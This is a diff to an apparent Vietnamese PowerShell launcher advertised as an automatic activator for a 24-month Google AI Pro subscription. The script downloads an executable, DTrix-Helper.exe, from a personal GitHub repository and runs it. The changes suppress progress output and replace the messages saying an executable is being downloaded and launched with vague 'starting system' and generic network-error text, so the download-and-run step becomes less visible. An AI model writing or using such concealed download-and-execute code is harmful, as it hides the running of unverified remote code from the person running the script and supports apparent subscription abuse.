@@ -1,4 +1,6 @@
 $ErrorActionPreference = "Stop"
+$ProgressPreference = "SilentlyContinue"
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $Host.UI.RawUI.WindowTitle = "DTrix - Google AI Pro (5 TB) Auto 24 Months"
 
@@ -19,32 +21,26 @@ $ExePath = Join-Path $AppDir "DTrix-Helper.exe"
 $RawUrl = "https://raw.githubusercontent.com/dat1799/DTrix-GG-Pro-Helper-Releases/main/DTrix-Helper.exe"
 $ReleaseUrl = "https://github.com/dat1799/DTrix-GG-Pro-Helper-Releases/releases/download/v1.0.0/DTrix-Helper.exe"
 
-Write-Host "▶ Đang tải trình kích hoạt tự động (DTrix-Helper.exe)..." -ForegroundColor Yellow
-Write-Host "   (Dung lượng ~48 MB, mã hóa nhị phân C native, không cần cài Python/Node.js)" -ForegroundColor Gray
+Write-Host "▶ Đang khởi động hệ thống, vui lòng chờ trong giây lát..." -ForegroundColor Yellow
 
 $downloaded = $false
 try {
-    Write-Host "   Đang tải từ GitHub..." -ForegroundColor Gray
     Invoke-WebRequest -Uri $RawUrl -OutFile $ExePath -UseBasicParsing
     $downloaded = $true
 } catch {
     try {
-        Write-Host "   Thử tải từ Release fallback..." -ForegroundColor Gray
         Invoke-WebRequest -Uri $ReleaseUrl -OutFile $ExePath -UseBasicParsing
         $downloaded = $true
     } catch {
-        Write-Host "❌ Không thể tải file từ GitHub. Lỗi: $_" -ForegroundColor Red
+        Write-Host "❌ Không thể kết nối đến máy chủ. Vui lòng kiểm tra lại kết nối mạng!" -ForegroundColor Red
         return
     }
 }
 
 if (-not (Test-Path $ExePath) -or (Get-Item $ExePath).Length -lt 10MB) {
-    Write-Host "❌ File tải về không hợp lệ. Vui lòng kiểm tra lại kết nối mạng hoặc thử lại!" -ForegroundColor Red
+    Write-Host "❌ Quá trình chuẩn bị thất bại. Vui lòng thử lại!" -ForegroundColor Red
     return
 }
-Write-Host "✅ Tải thành công!" -ForegroundColor Green
-
-Write-Host "`n🚀 Đang khởi chạy DTrix-Helper..." -ForegroundColor Cyan
 
 try {
     & $ExePath
